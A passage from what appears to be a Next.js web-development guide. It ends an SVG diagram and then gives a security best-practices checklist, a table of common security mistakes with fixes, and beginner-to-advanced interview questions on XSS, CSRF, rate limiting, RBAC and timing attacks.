  <text x="30" y="185" text-anchor="middle" fill="#fecaca" font-size="9" transform="rotate(-90, 30, 185)">REJECTED →</text>

  <defs>
    <marker id="rq1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#475569"/>
    </marker>
    <marker id="rq2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#f87171"/>
    </marker>
  </defs>
</svg>
```

---

## 21.16 Security Best Practices

- ✅ Always hash passwords with bcrypt (cost factor ≥ 12) — never MD5 or SHA1
- ✅ Use `httpOnly`, `secure`, and `sameSite` on all authentication cookies
- ✅ Validate and sanitize **all** user inputs server-side, even if validated client-side
- ✅ Use parameterized queries or ORMs — never string-concatenate SQL
- ✅ Add rate limiting to all public-facing API routes, especially login
- ✅ Use environment variables for all secrets — never hardcode
- ✅ Validate env vars at startup with Zod to catch misconfigurations early
- ✅ Return generic error messages to clients — log detailed errors server-side
- ✅ Set appropriate security headers via `next.config.js`
- ✅ Use HTTPS everywhere — enforce HSTS in production
- ✅ Implement RBAC at the middleware level, not just in individual routes
- ✅ Audit log all authentication events (logins, failures, logouts)

---

## 21.17 Common Security Mistakes

| Mistake | Risk | Fix |
|---------|------|-----|
| Storing JWTs in `localStorage` | XSS can steal tokens | Use `httpOnly` cookies |
| Revealing if email exists on login | User enumeration | Always return generic "Invalid credentials" |
| No rate limiting on login | Brute force attacks | Limit by IP and account |
| Using `NEXT_PUBLIC_` for secrets | Secret exposed in browser bundle | Use server-only env vars |
| Trusting client-side auth checks | Easy to bypass in DevTools | Always verify on server |
| Not validating file uploads | Malicious file execution | Validate MIME type + scan |
| Verbose error messages | Leaks internal structure | Generic client errors |
| Skipping CSRF protection | Forged requests | Origin check + SameSite cookies |

---

## 21.18 Interview Questions — Security

**Beginner:**
1. What is XSS and how does Next.js/React protect against it by default?
2. What is the difference between authentication and authorization?
3. Why should you use `httpOnly` cookies for session tokens?

**Intermediate:**
4. How does CSRF work, and what two mechanisms does Next.js use to prevent it?
5. What is the purpose of the `NEXT_PUBLIC_` prefix in environment variables?
6. How would you implement rate limiting on a Next.js API route?

**Advanced:**
7. How would you design a complete RBAC system for a multi-tenant Next.js application?
8. What is a timing attack and how does bcrypt's constant-time comparison prevent it?
9. You find that JWTs are being stored in `localStorage` in a production app. What are the exact attack vectors, and what is your remediation plan?

---
